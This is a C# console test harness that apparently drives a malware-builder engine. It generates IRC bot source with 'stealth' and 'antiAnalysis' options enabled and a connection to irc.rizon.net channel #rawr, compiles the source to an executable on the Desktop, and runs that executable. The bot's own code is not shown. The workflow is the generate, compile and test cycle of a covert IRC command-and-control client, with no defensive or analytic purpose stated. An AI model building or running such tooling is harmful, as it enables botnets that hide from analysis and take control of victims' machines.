using System;
using System.Collections.Generic;
using System.Threading.Tasks;
using RawrZDesktop.Engines;

namespace TestIrcBotConsole
{
    class Program
    {
        static async Task Main(string[] args)
        {
            Console.WriteLine("[TEST] Starting IRC Bot Compilation Test...");
            
            var ircBotEngine = new IrcBotEngine();
            
            // Test 1: Generate IRC Bot Source Code
            Console.WriteLine("[TEST] Generating IRC Bot source code...");
            var generateParams = new Dictionary<string, object>
            {
                ["operation"] = "generate",
                ["server"] = "irc.rizon.net",
                ["port"] = "6667",
                ["channels"] = "#rawr,#test",
                ["nick"] = "RawrZTestBot",
                ["username"] = "rawrzuser",
                ["realname"] = "RawrZ Test Bot",
                ["password"] = "",
                ["encryption"] = "aes-256-gcm",
                ["stealth"] = "true",
                ["antiAnalysis"] = "true"
            };
            
            var generateResult = await ircBotEngine.ExecuteAsync(generateParams);
            
            if (generateResult.Success)
            {
                Console.WriteLine($"[SUCCESS] IRC Bot source generated: {generateResult.Metadata["filepath"]}");
                
                // Test 2: Compile the generated source code
                Console.WriteLine("[TEST] Compiling IRC Bot source code...");
                var compileParams = new Dictionary<string, object>
                {
                    ["operation"] = "compile",
                    ["sourceCode"] = System.Text.Encoding.UTF8.GetString(generateResult.Data),
                    ["outputPath"] = System.IO.Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), "RawrZTestBot.exe")
                };
                
                var compileResult = await ircBotEngine.ExecuteAsync(compileParams);
                
                if (compileResult.Success)
                {
                    Console.WriteLine($"[SUCCESS] IRC Bot compiled successfully: {compileResult.Metadata["outputPath"]}");
                    
                    // Test 3: Test the compiled executable
                    Console.WriteLine("[TEST] Testing compiled IRC Bot executable...");
                    var testParams = new Dictionary<string, object>
                    {
                        ["operation"] = "test",
                        ["executablePath"] = compileResult.Metadata["outputPath"]
                    };
                    
                    var testResult = await ircBotEngine.ExecuteAsync(testParams);
                    
                    if (testResult.Success)
                    {
                        Console.WriteLine("[SUCCESS] IRC Bot executable test passed!");
                        Console.WriteLine($"[INFO] Exit Code: {testResult.Metadata["exitCode"]}");
                        Console.WriteLine($"[INFO] Execution Time: {testResult.Metadata["executionTime"]}");
                    }
                    else
                    {
                        Console.WriteLine($"[ERROR] IRC Bot executable test failed: {testResult.Error}");
                    }
                }
                else
                {
                    Console.WriteLine($"[ERROR] IRC Bot compilation failed: {compileResult.Error}");
                }
            }
            else
            {
                Console.WriteLine($"[ERROR] IRC Bot source generation failed: {generateResult.Error}");
            }
            
            Console.WriteLine("[TEST] IRC Bot Compilation Test completed.");
            Console.WriteLine("Press any key to exit...");
            Console.ReadKey();
        }
    }
}
